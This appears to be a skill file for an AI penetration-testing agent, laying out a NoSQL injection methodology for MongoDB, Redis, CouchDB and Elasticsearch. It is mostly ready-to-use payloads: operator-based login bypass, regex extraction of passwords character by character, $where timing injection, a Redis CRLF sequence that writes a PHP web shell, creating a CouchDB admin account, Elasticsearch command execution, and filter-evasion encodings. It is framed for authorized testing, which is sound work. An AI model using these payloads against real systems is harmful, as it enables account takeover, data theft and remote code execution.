---
name: nosql-injection
description: Detect and exploit NoSQL injection in MongoDB, Redis, CouchDB, and Elasticsearch
origin: AI Threat Hunting
---

# NoSQL Injection Testing

## When to Activate

- Application uses MongoDB, CouchDB, Redis, or Elasticsearch as a data store
- Parameters may reach NoSQL queries via operator injection or JavaScript execution
- Login forms, search features, or API filters backed by document databases

## Tools

- `curl` (manual injection probing and payload delivery)
- OOB callback server (operator-provisioned for blind confirmation)
- Browser DevTools (observe JSON request bodies and responses)

## Methodology

### 1. Identify Injection Points
- [ ] Test both JSON body and URL-encoded parameter formats
- [ ] Check query parameters, POST bodies, cookies, and headers
- [ ] Look for MongoDB-style error messages (`MongoServerError`, `$operator`, `BSONObj`)

### 2. MongoDB Operator Injection
- [ ] Auth bypass via operator injection
```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$ne": "wrongpassword"}}
{"username": {"$exists": true}, "password": {"$exists": true}}
```
- [ ] Array injection in URL-encoded form
```
username[$ne]=&password[$ne]=
username[$gt]=&password[$gt]=
username=admin&password[$regex]=.*
```
- [ ] Regex-based data extraction
```json
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
{"username": "admin", "password": {"$regex": "^abc"}}
```
- [ ] Binary search character-by-character to extract full values

### 3. JavaScript Injection via $where
Note: `$where` is deprecated in MongoDB 4.2+ and server-side JS removed in 5.0+. Test only if target runs MongoDB < 5.0.
- [ ] Basic tautology
```json
{"$where": "1==1"}
{"$where": "this.username == 'admin'"}
```
- [ ] Data exfiltration
```json
{"$where": "this.password.match(/^a/) ? true : false"}
```
- [ ] Blind timing injection (requires server-side JS enabled, pre-4.0)
```json
{"$where": "sleep(5000) || true"}
{"$where": "function(){sleep(5000);return true;}"}
```

### 4. Aggregation Pipeline Injection
- [ ] Test `$lookup`, `$merge`, `$out` for cross-collection access
```json
[{"$lookup": {"from": "users", "localField": "_id", "foreignField": "_id", "as": "leaked"}}]
```

### 5. Redis Command Injection
- [ ] Via SSRF or direct parameter injection
```
\r\nCONFIG SET dir /var/www/html\r\n
\r\nCONFIG SET dbfilename shell.php\r\n
\r\nSET payload "<?php system($_GET['cmd']);?>"\r\n
\r\nSAVE\r\n
```

### 6. CouchDB Injection
- [ ] Check for Fauxton admin panel: `GET /_utils/`
- [ ] Unauthenticated database listing: `GET /_all_dbs`
- [ ] Document enumeration: `GET /dbname/_all_docs?include_docs=true`
- [ ] View injection via Mango query selectors:
```json
POST /dbname/_find
{"selector": {"password": {"$regex": "^a"}}}
```
- [ ] Admin party (no auth configured): `PUT /_config/admins/attacker` with password value
- [ ] JavaScript view injection if views accept user input:
```json
{"map": "function(doc) { emit(doc._id, doc.password); }"}
```

### 7. Elasticsearch Query DSL Injection
Note: Inline scripting disabled by default since ES 5.x. Requires `script.inline: true` or Painless scripting context.
- [ ] Script injection in search queries
```json
{"query": {"bool": {"must": [{"script": {"script": "java.lang.Runtime.getRuntime().exec('id')"}}]}}}
```
- [ ] Wildcard and regex abuse for data extraction
```json
{"query": {"regexp": {"password": {"value": "a.*"}}}}
```

### 8. WAF / Filter Bypass
- [ ] Unicode encoding of operators: `\u0024ne` for `$ne`
- [ ] Nested objects: `{"username": {"$ne": null}}` vs flat params
- [ ] Mixed Content-Type: send JSON body with `application/x-www-form-urlencoded` header
- [ ] Double encoding: `%2524ne` for `$ne`

## What to Record

- Injection point (URL, parameter, method, Content-Type)
- Payload that triggered the vulnerability
- Evidence of bypass or data extraction (auth bypass screenshot, extracted data)
- Backend database type and version if disclosed
- Full request/response for reproducibility

## Extended Resources

- `agent/references/payloads/nosql-injection-payloads.md` — MongoDB operators ($gt, $ne, $regex, $where), auth bypass, blind extraction
